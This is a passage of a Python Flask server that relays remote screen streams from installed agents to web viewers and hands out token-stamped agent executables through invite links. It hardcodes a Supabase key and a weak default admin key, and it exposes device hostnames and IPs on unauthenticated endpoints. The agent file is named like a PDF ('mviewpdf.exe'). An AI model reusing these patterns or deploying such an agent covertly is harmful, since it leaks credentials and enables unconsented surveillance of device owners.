"""
╔══════════════════════════════════════════════════════════════════════════════╗
║       Screen Connect Relay + Distribution Server  v10.0  — ENTERPRISE       ║
║       Multi-Machine • Room-Isolated • Crash-Proof • Full Feature Set         ║
║                                                                              ║
║  WHAT'S NEW IN v10.0 (ENTERPRISE PARITY OVERHAUL):                           ║
║  • FIXED: Agent eviction now properly notifies active viewers with            ║
║    `stream_reconnecting` event so dashboard auto-resubscribes to new agent   ║
║  • FIXED: Viewer idle-timeout enforcement loop now actually runs (was         ║
║    configured but never enforced — loop was missing entirely)                ║
║  • FIXED: Max session duration enforcement loop now actually runs             ║
║  • FIXED: Agent leave_room on eviction — old SID is removed from device      ║
║    room before disconnect so it never receives stale commands                ║
║  • FIXED: Rate limiting now covers ALL routes, not just invite/guide         ║
║  • NEW: POST /api/viewer/<sid>/kick — admin endpoint to force-disconnect     ║
║    a specific viewer (ScreenConnect parity: host can kick any guest)         ║
║  • NEW: GET /api/sessions/live — returns all active viewer sessions with      ║
║    idle time, duration, and device binding                                   ║
║  • NEW: Seamless session handoff — when new agent connects, active viewers    ║
║    are sent `agent_replaced` + `watch_ok` so they resume without page reload ║
║  • NEW: Per-device stream quality negotiation — agent reports cap, server    ║
║    clamps viewer requests within agent's declared limits                     ║
║  • NEW: `evicted` event now carries `session_id` so agent can log it         ║
║  • NEW: Admin webhook support — POST to WEBHOOK_URL on key events            ║
║  • IMPROVED: GOP buffer cleared atomically on agent evict + reconnect        ║
║  • IMPROVED: _adv_auth_event lifecycle managed server-side via per-agent     ║
║    session sequence numbers to prevent stale-frame replay on reconnect       ║
║  • IMPROVED: heartbeat watchdog now emits `stream_reconnecting` before       ║
║    marking device offline so viewer can show spinner, not black screen       ║
╚══════════════════════════════════════════════════════════════════════════════╝

INSTALL:
  pip install flask flask-cors flask-socketio supabase python-dotenv \\
              gunicorn gevent gevent-websocket requests

RENDER start command:
  gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\
           -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app
"""

import os
import re
import time
import uuid
import logging
import datetime
import threading
import collections
import secrets
import traceback
import json
from logging.handlers import RotatingFileHandler

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

from pathlib import Path
from functools import wraps

from flask import Flask, request, jsonify, send_from_directory, make_response, Response, redirect

try:
    from flask_socketio import SocketIO, emit, join_room, leave_room
    SOCKETIO_OK = True
except ImportError:
    SOCKETIO_OK = False
    print("[WARN] flask-socketio not installed")

try:
    import requests as _requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

# ══════════════════════════════════════════════════════════════════════════════
#  Configuration
# ══════════════════════════════════════════════════════════════════════════════
SUPABASE_URL  = os.environ.get("SUPABASE_URL")  or "https://iacdzpcoftxxcoigopun.supabase.co"
SUPABASE_KEY  = os.environ.get("SUPABASE_KEY")  or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlhY2R6cGNvZnR4eGNvaWdvcHVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjA1NTUsImV4cCI6MjA5MTk5NjU1NX0.5Eo21XrLTWL3RyKmuvJPdaS-NssraDMyAxVMFy-F054"
ADMIN_KEY     = os.environ.get("ADMIN_KEY",    "mview-admin-secret")
TABLE         = os.environ.get("SB_TABLE",     "devices")
PORT          = int(os.environ.get("PORT", 5000))
VERSION       = "10.0.0"

AGENT_STORAGE_URL = os.environ.get(
    "AGENT_STORAGE_URL",
    "https://github.com/maxwelnkaranja-ops/mview/releases/download/v4.0/mviewpdf.exe"
)
AGENT_DIR   = os.environ.get("AGENT_DIR",  "bin")
AGENT_FILE  = os.environ.get("AGENT_FILE", "master_agent.exe")

HEARTBEAT_TIMEOUT = int(os.environ.get("HEARTBEAT_TIMEOUT", "35"))

# ── Enterprise session management ────────────────────────────────────────────
# Max concurrent viewers per device (0 = unlimited)
MAX_VIEWERS_PER_DEVICE = int(os.environ.get("MAX_VIEWERS_PER_DEVICE", "0"))
# Kick idle viewers after N seconds of no input (0 = off)
VIEWER_IDLE_TIMEOUT    = int(os.environ.get("VIEWER_IDLE_TIMEOUT",    "0"))
# Maximum session wall-clock duration in seconds (0 = unlimited)
MAX_SESSION_DURATION   = int(os.environ.get("MAX_SESSION_DURATION",   "0"))
# Reject duplicate agent and evict stale one (True = ScreenConnect behaviour)
AGENT_EXCLUSIVE        = os.environ.get("AGENT_EXCLUSIVE", "true").lower() not in ("0", "false", "no")
# Optional webhook URL for key events (agent online/offline, evictions)
WEBHOOK_URL            = os.environ.get("WEBHOOK_URL", "").strip()

SELF_PING_INTERVAL = int(os.environ.get("SELF_PING_INTERVAL", "240"))
TOKEN_RE = re.compile(r"^MV-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}$")

_frame_stats: dict = collections.defaultdict(lambda: collections.deque(maxlen=300))
_frame_stats_lock  = threading.Lock()

# ══════════════════════════════════════════════════════════════════════════════
#  Logging
# ══════════════════════════════════════════════════════════════════════════════
_LOG_DIR  = os.environ.get("LOG_DIR", os.path.join(os.path.expanduser("~"), "mview_server_logs"))
os.makedirs(_LOG_DIR, exist_ok=True)
_LOG_FILE = os.path.join(_LOG_DIR, "server.log")

_log_fmt = logging.Formatter(
    "%(asctime)s  %(levelname)-8s  [%(threadName)s]  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
_file_handler    = RotatingFileHandler(_LOG_FILE, maxBytes=4 * 1024 * 1024, backupCount=5)
_file_handler.setFormatter(_log_fmt)
_console_handler = logging.StreamHandler()
_console_handler.setFormatter(_log_fmt)

logging.basicConfig(level=logging.INFO, handlers=[_file_handler, _console_handler])
log = logging.getLogger("screenconnect")

_req_local = threading.local()

def _req_id() -> str:
    return getattr(_req_local, "id", "-")

_CRASH_DIR = os.path.join(_LOG_DIR, "crashes")
os.makedirs(_CRASH_DIR, exist_ok=True)

def _report_crash(context: str, exc: Exception):
    ts  = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")
    txt = f"=== SERVER CRASH REPORT ===\nContext: {context}\nTime: {ts}\n\n{traceback.format_exc()}"
    path = os.path.join(_CRASH_DIR, f"crash_{ts}.txt")
    try:
        with open(path, "w") as fh:
            fh.write(txt)
        reports = sorted(os.listdir(_CRASH_DIR))
        for old in reports[:-5]:
            try:
                os.remove(os.path.join(_CRASH_DIR, old))
            except Exception:
                pass
    except Exception:
        pass
    log.error(f"CRASH in {context}: {exc}\n{traceback.format_exc()}")

def _global_exc_hook(exc_type, exc_value, exc_tb):
    if issubclass(exc_type, KeyboardInterrupt):
        import sys
        sys.__excepthook__(exc_type, exc_value, exc_tb)
        return
    log.critical("Unhandled exception", exc_info=(exc_type, exc_value, exc_tb))
    _report_crash("global_exc_hook", exc_value)

import sys as _sys
_sys.excepthook = _global_exc_hook

# ══════════════════════════════════════════════════════════════════════════════
#  Webhook helper
# ══════════════════════════════════════════════════════════════════════════════
def _fire_webhook(event: str, payload: dict):
    """POST to WEBHOOK_URL (if configured) in a daemon thread — never blocks."""
    if not WEBHOOK_URL or not REQUESTS_OK:
        return
    def _do():
        try:
            _requests.post(WEBHOOK_URL, json={"event": event, "ts": utcnow(), **payload},
                           timeout=8, headers={"User-Agent": "MViewServer/10.0"})
        except Exception as e:
            log.debug(f"Webhook error ({event}): {e}")
    threading.Thread(target=_do, daemon=True, name="webhook").start()

# ══════════════════════════════════════════════════════════════════════════════
#  Flask + CORS + SocketIO
# ══════════════════════════════════════════════════════════════════════════════
app = Flask(__name__, static_folder=".", static_url_path="")

try:
    from flask_cors import CORS
    CORS(
        app,
        resources={r"/*": {"origins": "*"}},
        allow_headers=["Content-Type", "Authorization", "X-Admin-Key"],
        methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
        supports_credentials=False,
    )
    log.info("flask-cors loaded.")
except ImportError:
    log.warning("flask-cors not installed — using manual CORS headers fallback.")

if SOCKETIO_OK:
    sio = SocketIO(
        app,
        cors_allowed_origins="*",
        async_mode="gevent",
        logger=False,
        engineio_logger=False,
        ping_timeout=60,
        ping_interval=20,
        max_http_buffer_size=512 * 1024 * 1024,
        allow_upgrades=True,
    )
else:
    sio = None

# ══════════════════════════════════════════════════════════════════════════════
#  In-memory state
# ══════════════════════════════════════════════════════════════════════════════
_devices:   dict = {}
_dev_lock          = threading.Lock()

_sid_to_device: dict = {}
_sid_lock = threading.Lock()

_viewers: dict = collections.defaultdict(set)
_view_lock = threading.Lock()

_dashboard_device: dict = {}
_dash_lock = threading.Lock()

# ── Enterprise session tracking ──────────────────────────────────────────────
_viewer_last_activity: dict = {}   # viewer_sid → monotonic timestamp of last input
_viewer_session_start: dict = {}   # viewer_sid → monotonic timestamp when joined
_viewer_activity_lock = threading.Lock()

# ── Advanced Monitor state ───────────────────────────────────────────────────
_adv_agent_sids:    dict = {}   # device_id  → agent socket sid
_adv_sid_to_agent:  dict = {}   # agent sid  → device_id
_adv_viewer_rooms:  dict = {}   # viewer sid → device_id
_adv_gop_buf:       dict = {}   # device_id → deque of frame bytes (maxlen=64)
_adv_gop_lock             = threading.Lock()
_adv_cursor_latest: dict = {}   # device_id → latest cursor_bin bytes

# ── Agent session sequence (prevents stale-frame replay on reconnect) ────────
# Each time an agent connects for a device_id, we increment the sequence.
# GOP buffers are tagged; viewers only accept frames from the current sequence.
_agent_session_seq: dict = {}   # device_id → int
_agent_seq_lock          = threading.Lock()

_agent_cache: bytes = None
_agent_dl_cache: dict = {}
_AGENT_DL_TTL   = 600
_agent_cache_ts: float     = 0.0
_agent_cache_lock          = threading.Lock()
AGENT_CACHE_TTL            = 300

_sb      = None
_sb_lock = threading.Lock()

# ══════════════════════════════════════════════════════════════════════════════
#  Supabase helpers
# ══════════════════════════════════════════════════════════════════════════════
def get_sb():
    global _sb
    with _sb_lock:
        if _sb:
            return _sb
        try:
            from supabase import create_client
            _sb = create_client(SUPABASE_URL, SUPABASE_KEY)
            log.info("Supabase connected.")
            return _sb
        except Exception as e:
            log.warning(f"Supabase unavailable: {e}")
            return None

def _sb_reset():
    global _sb
    with _sb_lock:
        _sb = None

def _sb_retry(fn, attempts=3, delay=1.0):
    for i in range(attempts):
        try:
            return fn(), True
        except Exception as e:
            if i == attempts - 1:
                log.error(f"Supabase op failed after {attempts} attempts: {e}")
                _sb_reset()
                return None, False
            time.sleep(delay * (2 ** i))
    return None, False

def db_get(token):
    sb = get_sb()
    if not sb:
        return {"device_id": token, "status": "pending", "expires_at": None}
    result, ok = _sb_retry(lambda: sb.table(TABLE).select("*").eq("device_id", token).execute())
    if ok and result:
        rows = result.data or []
        return rows[0] if rows else None
    return {"device_id": token, "status": "pending", "expires_at": None}

def db_update(token, upd: dict):
    sb = get_sb()
    if not sb:
        return False
    result, ok = _sb_retry(lambda: sb.table(TABLE).update(upd).eq("device_id", token).execute())
    return ok

def db_upsert(token, upd: dict):
    sb = get_sb()
    if not sb:
        return False
    payload = {"device_id": token, **upd}
    result, ok = _sb_retry(lambda: sb.table(TABLE).upsert(payload, on_conflict="device_id").execute())
    if not ok:
        updated, ok2 = _sb_retry(lambda: sb.table(TABLE).update(upd).eq("device_id", token).execute())
        if ok2 and updated and updated.data:
            return True
        _, ok3 = _sb_retry(lambda: sb.table(TABLE).insert(payload).execute())
        return ok3
    return ok

def db_insert(payload: dict):
    sb = get_sb()
    if not sb:
        return payload
    result, ok = _sb_retry(lambda: sb.table(TABLE).insert(payload).execute())
    if ok and result:
        return (result.data or [payload])[0]
    safe = {k: v for k, v in payload.items() if k not in ("link_mode", "redirect_url")}
    result2, ok2 = _sb_retry(lambda: sb.table(TABLE).insert(safe).execute())
    if ok2 and result2:
        log.warning("db_insert: retried without link_mode/redirect_url")
        return (result2.data or [safe])[0]
    return payload

def db_list_all() -> list:
    sb = get_sb()
    if not sb:
        return []
    result, ok = _sb_retry(lambda: sb.table(TABLE).select("*").order("created_at", desc=True).execute())
    if ok and result:
        return result.data or []
    return []

# ══════════════════════════════════════════════════════════════════════════════
#  Agent binary helpers
# ══════════════════════════════════════════════════════════════════════════════
def _fetch_agent_bytes() -> bytes:
    global _agent_cache, _agent_cache_ts
    with _agent_cache_lock:
        now = time.time()
        if _agent_cache and (now - _agent_cache_ts) < AGENT_CACHE_TTL:
            return _agent_cache
        local = Path(AGENT_DIR) / AGENT_FILE
        if local.is_file():
            log.info(f"Loading agent from local file: {local}  ({local.stat().st_size:,} bytes)")
            _agent_cache    = local.read_bytes()
            _agent_cache_ts = now
            return _agent_cache
        if REQUESTS_OK and AGENT_STORAGE_URL:
            try:
                log.info(f"Fetching agent from: {AGENT_STORAGE_URL}")
                resp = _requests.get(AGENT_STORAGE_URL, timeout=120, allow_redirects=True,
                                     headers={"User-Agent": "MViewAgent/1.0"})
                if resp.status_code == 200 and len(resp.content) > 1_000:
                    _agent_cache    = resp.content
                    _agent_cache_ts = now
                    return _agent_cache
                log.error(f"Agent fetch HTTP {resp.status_code}")
            except Exception as e:
                log.warning(f"Agent fetch error: {e}")
        return None

def _build_patched_agent(token: str) -> bytes:
    raw = _fetch_agent_bytes()
    if not raw:
        return None
    MAGIC_HEAD  = b"MVTK"
    MAGIC_TAIL  = b"MVED"
    TOKEN_FIELD = 56
    tok_bytes = token.encode("utf-8")[:TOKEN_FIELD]
    padded    = tok_bytes.ljust(TOKEN_FIELD, b"\x00")
    trailer   = MAGIC_HEAD + padded + MAGIC_TAIL
    return raw + trailer

# ══════════════════════════════════════════════════════════════════════════════
#  Misc helpers
# ══════════════════════════════════════════════════════════════════════════════
def utcnow() -> str:
    return datetime.datetime.utcnow().isoformat()

def is_expired(s: dict) -> bool:
    exp = s.get("expires_at")
    if not exp:
        return False
    try:
        dt = datetime.datetime.fromisoformat(exp.replace("Z", "+00:00"))
        return datetime.datetime.now(datetime.timezone.utc) > dt
    except Exception:
        return False

def valid_token(t) -> bool:
    return bool(TOKEN_RE.match(t or ""))

def require_admin(f):
    @wraps(f)
    def w(*a, **k):
        if request.headers.get("X-Admin-Key", "") != ADMIN_KEY:
            log.warning(f"[{_req_id()}] Unauthorised admin access: path={request.path} ip={request.remote_addr}")
            return jsonify({"error": "Unauthorised", "req_id": _req_id()}), 401
        return f(*a, **k)
    return w

def broadcast_device_update():
    if not sio:
        return
    try:
        rows = db_list_all()
        with _dev_lock:
            live = {d["device_id"]: d for d in _devices.values()}
        for row in rows:
            did = row.get("device_id", "")
            if did in live:
                row["_live"]       = True
                row["cpu"]         = live[did].get("cpu")
                row["ram"]         = live[did].get("ram")
                row["last_beat"]   = live[did].get("last_beat")
                row["frame_count"] = live[did].get("frame_count", 0)
        sio.emit("device_update", {"rows": rows, "ts": utcnow()})
        try:
            _broadcast_device_list()
        except Exception:
            pass
    except Exception as e:
        log.error(f"broadcast_device_update error: {e}")

def _get_device_for_viewer(viewer_sid: str) -> str:
    with _dash_lock:
        return _dashboard_device.get(viewer_sid)

def _cleanup_viewer(viewer_sid: str):
    """Remove a dashboard viewer from all rooms and maps. Called on disconnect."""
    with _dash_lock:
        did = _dashboard_device.pop(viewer_sid, None)
    if did:
        with _view_lock:
            _viewers[did].discard(viewer_sid)
        log.info(f"Viewer {viewer_sid} cleaned up from device {did}")
    adv_did = _adv_viewer_rooms.pop(viewer_sid, None)
    if adv_did:
        vcount = sum(1 for v in _adv_viewer_rooms.values() if v == adv_did)
        agent_sid = _adv_agent_sids.get(adv_did)
        if agent_sid and sio:
            sio.emit("viewer_count", {"count": vcount}, room=agent_sid)
    # Remove from enterprise session tracking
    with _viewer_activity_lock:
        _viewer_last_activity.pop(viewer_sid, None)
        _viewer_session_start.pop(viewer_sid, None)

def _notify_viewers_reconnecting(did: str):
    """
    ScreenConnect parity: when an agent drops/reconnects, tell viewers to show
    a reconnecting spinner instead of a black screen. Viewers auto-resubscribe
    when the new agent sends agent_online.
    """
    if not sio:
        return
    sio.emit("stream_reconnecting", {"device_id": did, "ts": utcnow()}, room=f"view:{did}")
    sio.emit("stream_reconnecting", {"device_id": did, "ts": utcnow()}, room=f"adv_viewers_{did}")

def _cleanup_agent(agent_sid: str):
    """Remove an agent by SID, emit offline events, clear GOP buffer."""
    with _sid_lock:
        did = _sid_to_device.pop(agent_sid, None)
    if not did:
        return
    with _dev_lock:
        dev = _devices.pop(did, None)
    for d, asid in list(_adv_agent_sids.items()):
        if asid == agent_sid:
            old_sid = _adv_agent_sids.pop(d, None)
            if old_sid:
                _adv_sid_to_agent.pop(old_sid, None)
            break
    # Notify viewers BEFORE clearing GOP — they need to show spinner
    _notify_viewers_reconnecting(did)
    # Clear GOP so reconnected viewers don't get stale frames
    with _adv_gop_lock:
        _adv_gop_buf.pop(did, None)
    _adv_cursor_latest.pop(did, None)
    if dev:
        label = dev.get("label", did)
        log.warning(f"Agent disconnected: {label} ({did})")
        _audit("agent_offline", device_id=did, label=label)
        db_update(did, {"status": "offline", "disconnected_at": utcnow()})
        if sio:
            sio.emit("agent_offline",  {"device_id": did, "label": label, "ts": utcnow()})
            sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
        broadcast_device_update()
        _fire_webhook("agent_offline", {"device_id": did, "label": label})

# ══════════════════════════════════════════════════════════════════════════════
#  Rate limiting — sliding window per IP (applied to ALL routes)
# ══════════════════════════════════════════════════════════════════════════════
_RATE_LIMIT_RPM = int(os.environ.get("RATE_LIMIT_RPM", "120"))
_rate_buckets: dict = collections.defaultdict(collections.deque)
_rate_lock          = threading.Lock()

def _rate_check(ip: str) -> bool:
    if _RATE_LIMIT_RPM <= 0:
        return True
    now = time.time()
    with _rate_lock:
        dq = _rate_buckets[ip]
        while dq and now - dq[0] > 60:
            dq.popleft()
        if len(dq) >= _RATE_LIMIT_RPM:
            return False
        dq.append(now)
    return True

# ══════════════════════════════════════════════════════════════════════════════
#  CORS + Rate limit on every HTTP request
# ══════════════════════════════════════════════════════════════════════════════
@app.before_request
def handle_preflight():
    _req_local.id = uuid.uuid4().hex[:8]
    if request.method == "OPTIONS":
        resp = make_response("", 204)
        resp.headers["Access-Control-Allow-Origin"]  = "*"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Admin-Key"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, PATCH, DELETE, OPTIONS"
        return resp
    # Apply rate limiting to all non-static routes
    if not request.path.startswith("/static"):
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
        if not _rate_check(ip):
            log.warning(f"[{_req_id()}] Rate limit exceeded: ip={ip} path={request.path}")
            return jsonify({"error": "Too many requests"}), 429

@app.after_request
def add_security_headers(resp):
    resp.headers.setdefault("X-Content-Type-Options", "nosniff")
    resp.headers.setdefault("X-Frame-Options",        "SAMEORIGIN")
    resp.headers.setdefault("X-XSS-Protection",       "1; mode=block")
    resp.headers.setdefault("Referrer-Policy",         "strict-origin-when-cross-origin")
    resp.headers["X-Request-ID"] = _req_id()
    return resp

# ══════════════════════════════════════════════════════════════════════════════
#  Static routes
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/")
def serve_root():
    for f in ("index.html", "app.html"):
        if Path(f).is_file():
            return send_from_directory(".", f)
    return jsonify({"status": "ok", "version": VERSION}), 200

@app.route("/app.html")
def serve_app_html():
    return send_from_directory(".", "app.html")

@app.route("/dashboard")
@app.route("/dashboard.html")
def serve_dashboard():
    return send_from_directory(".", "dashboard.html")

@app.route("/index.html")
def serve_index():
    return send_from_directory(".", "index.html")

@app.route("/login.html")
def serve_login():
    return redirect("/", 301)

@app.route("/session_manager.js")
def serve_session_manager():
    host = request.host_url.rstrip("/")
    js = f"""/* Auto-generated SessionManager v10 */
'use strict';
(function() {{
  const SERVER_URL = window.SCREEN_CONNECT_SERVER_URL || window.MVIEW_SERVER_URL || '{host}';
  const SUPABASE_URL = window.MVIEW_SUPABASE_URL || '{SUPABASE_URL}';
  const SUPABASE_KEY = window.MVIEW_SUPABASE_ANON_KEY || '{SUPABASE_KEY}';
  let _pollTimer = null;
  let _currentToken = null;
  const SM = {{
    CONFIG: {{ SERVER_URL, SUPABASE_URL, SUPABASE_ANON_KEY: SUPABASE_KEY }},
    currentToken: null, currentLink: null,
    reset() {{
      if (_pollTimer) {{ clearInterval(_pollTimer); _pollTimer = null; }}
      _currentToken = null; SM.currentToken = null; SM.currentLink = null;
      ['device-step-3','device-step-2'].forEach(id => {{
        const el = document.getElementById(id); if(el) el.style.display = 'none';
      }});
      const s1 = document.getElementById('device-step-1'); if(s1) s1.style.display = '';
    }},
    async generateInviteLink() {{
      const label = (document.getElementById('device-name-input')||document.getElementById('device-label'))?.value?.trim() || 'New Device';
      const dtype = (document.getElementById('device-type-select')||document.getElementById('device-type'))?.value || 'Standard Display';
      const loc   = (document.getElementById('device-location-input')||document.getElementById('device-location'))?.value?.trim() || '';
      const s1 = document.getElementById('device-step-1');
      const s2 = document.getElementById('device-step-2');
      const s3 = document.getElementById('device-step-3');
      if(s1) s1.style.display = 'none'; if(s2) s2.style.display = '';
      try {{
        const resp = await fetch(SERVER_URL + '/api/invite', {{
          method: 'POST', headers: {{'Content-Type': 'application/json'}},
          body: JSON.stringify({{ label, device_type: dtype, location: loc }})
        }});
        const j = await resp.json();
        _currentToken = j.token || j.device_id; SM.currentToken = _currentToken;
        SM.currentLink = j.agent_url || j.download_url;
        const linkEl = document.getElementById('invite-link') || document.getElementById('link-url');
        if(linkEl) linkEl.value = SM.currentLink;
        const qrEl = document.getElementById('invite-qr');
        if(qrEl) qrEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=' + encodeURIComponent(SM.currentLink);
        if(s2) s2.style.display = 'none'; if(s3) s3.style.display = '';
        SM._pollStatus(_currentToken);
      }} catch(e) {{
        if(s2) s2.style.display = 'none'; if(s1) s1.style.display = '';
        SM._notify('Failed to generate invite: ' + e.message, 'warn');
      }}
    }},
    async copyLink() {{
      try {{ await navigator.clipboard.writeText(SM.currentLink || ''); SM._notify('Link copied!', 'ok'); }}
      catch(e) {{
        const inp = document.getElementById('invite-link') || document.getElementById('link-url');
        if(inp) {{ inp.select(); document.execCommand('copy'); }} SM._notify('Link copied!', 'ok');
      }}
    }},
    _pollStatus(token) {{
      let checks = 0;
      const tick = async () => {{
        checks++;
        try {{
          const r = await fetch(SERVER_URL + '/api/invite/status?token=' + token);
          const j = await r.json();
          const text = document.getElementById('step3-status');
          if(j.status === 'online') {{
            clearInterval(_pollTimer); _pollTimer = null;
            if(text) text.textContent = 'Device connected!';
            SM._notify('Device "' + j.label + '" is now online!', 'ok');
            SM.reset();
            if(typeof refreshDashboardFromSupabase === 'function') setTimeout(refreshDashboardFromSupabase, 1000);
            return;
          }}
          if(text) text.textContent = 'Waiting for agent... (' + checks + ')';
          if(checks > 120) {{ clearInterval(_pollTimer); _pollTimer = null; }}
        }} catch(e) {{}}
      }};
      _pollTimer = setInterval(tick, 5000); tick();
    }},
    _notify(msg, type) {{
      if(typeof showToast === 'function') {{ showToast(msg, type==='ok'?'success':type==='warn'?'error':'info'); }}
    }},
  }};
  window.SessionManager = SM;
}})();
"""
    return js, 200, {"Content-Type": "application/javascript"}


@app.route("/config.js")
def serve_config():
    if Path("config.js").is_file():
        return send_from_directory(".", "config.js", mimetype="application/javascript")
    host = request.host_url.rstrip("/")
    forwarded_proto = request.headers.get("X-Forwarded-Proto", "")
    if forwarded_proto == "https" or request.url.startswith("https"):
        host = "https://" + host.split("://", 1)[-1]
    host = host.rstrip("/")
    js = f"""/* Auto-generated by server.py v{VERSION} */
window.SCREEN_CONNECT_SERVER_URL    = '{host}';
window.MVIEW_SERVER_URL             = '{host}';
window.MVIEW_SUPABASE_URL           = '{SUPABASE_URL}';
window.MVIEW_SUPABASE_ANON_KEY      = '{SUPABASE_KEY}';
window.SC = window.SC || {{}};
window.SC.SERVER_URL = window.SCREEN_CONNECT_SERVER_URL;
window.SessionManager = window.SessionManager || {{}};
window.SessionManager.CONFIG = {{
  SERVER_URL:        window.SCREEN_CONNECT_SERVER_URL,
  SUPABASE_URL:      window.MVIEW_SUPABASE_URL,
  SUPABASE_ANON_KEY: window.MVIEW_SUPABASE_ANON_KEY,
}};
"""
    resp = make_response(js, 200)
    resp.headers["Content-Type"]  = "application/javascript"
    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    resp.headers["Pragma"]        = "no-cache"
    resp.headers["Expires"]       = "0"
    return resp

# ══════════════════════════════════════════════════════════════════════════════
#  Health / Status / API
# ══════════════════════════════════════════════════════════════════════════════
_SERVER_START = time.time()

@app.route("/status")
@app.route("/health")
@app.route("/api/server-info")
def health():
    with _dev_lock:
        online_count = len(_devices)
    uptime_s     = int(time.time() - _SERVER_START)
    crash_count  = len(os.listdir(_CRASH_DIR)) if os.path.isdir(_CRASH_DIR) else 0
    try:
        import psutil
        mem = psutil.Process().memory_info().rss // (1024 * 1024)
    except Exception:
        mem = None
    return jsonify({
        "status":          "ok",
        "version":         VERSION,
        "server_time":     utcnow(),
        "uptime_seconds":  uptime_s,
        "database":        get_sb() is not None,
        "socketio":        SOCKETIO_OK,
        "devices_online":  online_count,
        "agent_storage":   AGENT_STORAGE_URL,
        "agent_local":     (Path(AGENT_DIR) / AGENT_FILE).is_file(),
        "render_port":     PORT,
        "memory_mb":       mem,
        "crash_reports":   crash_count,
        "log_dir":         _LOG_DIR,
    })

@app.route("/api/crash", methods=["POST"])
def api_crash_report():
    data = request.get_json(silent=True) or {}
    ts   = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")
    did  = data.get("device_id", "unknown")[:64]
    path = os.path.join(_CRASH_DIR, f"agent_{did}_{ts}.txt")
    try:
        with open(path, "w") as fh:
            fh.write(json.dumps(data, indent=2))
        reports = sorted(f for f in os.listdir(_CRASH_DIR) if f.startswith(f"agent_{did}"))
        for old in reports[:-5]:
            try:
                os.remove(os.path.join(_CRASH_DIR, old))
            except Exception:
                pass
    except Exception as e:
        log.warning(f"Could not write agent crash report: {e}")
    log.error(f"AGENT CRASH [{did}]: {data.get('context','?')} — {data.get('error','?')}")
    return jsonify({"status": "received"}), 200

_audit_log: collections.deque = collections.deque(maxlen=500)
_audit_lock = threading.Lock()

def _audit(event: str, **kw):
    entry = {"ts": utcnow(), "event": event, **kw}
    with _audit_lock:
        _audit_log.append(entry)
    log.info(f"AUDIT: {event}  {kw}")

@app.route("/api/audit-log")
@require_admin
def api_audit_log():
    with _audit_lock:
        rows = list(_audit_log)
    return jsonify({"entries": rows[-200:], "total": len(rows)})

@app.route("/api/agent-info")
def api_agent_info():
    local = Path(AGENT_DIR) / AGENT_FILE
    return jsonify({
        "storage_url":  AGENT_STORAGE_URL,
        "local_file":   str(local.resolve()),
        "local_exists": local.is_file(),
        "local_size":   local.stat().st_size if local.is_file() else 0,
        "cache_size":   len(_agent_cache) if _agent_cache else 0,
    })

@app.route("/api/server-stats")
@require_admin
def api_server_stats():
    with _dev_lock:
        dev_count = len(_devices)
    with _view_lock:
        viewer_count = sum(len(v) for v in _viewers.values())
    with _rate_lock:
        rate_ips = len(_rate_buckets)
    with _adv_gop_lock:
        gop_devices = len(_adv_gop_buf)
    thread_count = threading.active_count()
    try:
        import psutil
        proc     = psutil.Process()
        mem_rss  = proc.memory_info().rss // (1024 * 1024)
        cpu_pct  = proc.cpu_percent(interval=0.1)
    except Exception:
        mem_rss = cpu_pct = None
    crash_count = len(os.listdir(_CRASH_DIR)) if os.path.isdir(_CRASH_DIR) else 0
    return jsonify({
        "version":               VERSION,
        "uptime_seconds":        int(time.time() - _SERVER_START),
        "devices_online":        dev_count,
        "viewers_active":        viewer_count,
        "adv_agent_sids":        len(_adv_agent_sids),
        "adv_viewer_rooms":      len(_adv_viewer_rooms),
        "gop_buffer_devices":    gop_devices,
        "rate_limit_tracked_ips": rate_ips,
        "threads":               thread_count,
        "memory_mb":             mem_rss,
        "cpu_pct":               cpu_pct,
        "crash_reports":         crash_count,
        "ts":                    utcnow(),
    })


@app.route("/metrics")
def api_metrics():
    with _dev_lock:
        devs = list(_devices.values())
    with _view_lock:
        total_viewers = sum(len(v) for v in _viewers.values())
    device_list = [{
        "id":         d.get("device_id"),
        "device_id":  d.get("device_id"),
        "label":      d.get("label"),
        "hostname":   d.get("hostname"),
        "os":         d.get("os"),
        "local_ip":   d.get("local_ip"),
        "cpu":        d.get("cpu"),
        "ram":        d.get("ram"),
        "status":     "online",
    } for d in devs]
    return jsonify({
        "status":         "ok",
        "version":        VERSION,
        "devices_online": len(devs),
        "viewers":        total_viewers,
        "devices":        device_list,
        "ts":             utcnow(),
    })

@app.route("/api/stream-stats")
def api_stream_stats_route():
    return api_stream_stats()

def api_stream_stats():
    stats = {}
    with _dev_lock:
        devs = dict(_devices)
    with _view_lock:
        views = {k: len(v) for k, v in _viewers.items()}
    adv_views: dict = {}
    for vsid, did in list(_adv_viewer_rooms.items()):
        adv_views[did] = adv_views.get(did, 0) + 1
    with _frame_stats_lock:
        for did, dq in _frame_stats.items():
            if not dq:
                continue
            now = time.time()
            recent = [(t, b) for t, b in dq if now - t < 5.0]
            fps = len(recent) / 5.0 if recent else 0
            bps = sum(b for _, b in recent) / 5.0 if recent else 0
            viewer_count = max(views.get(did, 0), adv_views.get(did, 0))
            stats[did] = {
                "fps":          round(fps, 1),
                "kbps":         round(bps / 1024, 1),
                "viewers":      viewer_count,
                "total_frames": devs.get(did, {}).get("frame_count", 0),
                "last_frame":   devs.get(did, {}).get("last_frame_ts", ""),
            }
    return jsonify({"stream_stats": stats, "ts": utcnow()})

@app.route("/api/devices")
def api_devices():
    with _dev_lock:
        devs = list(_devices.values())
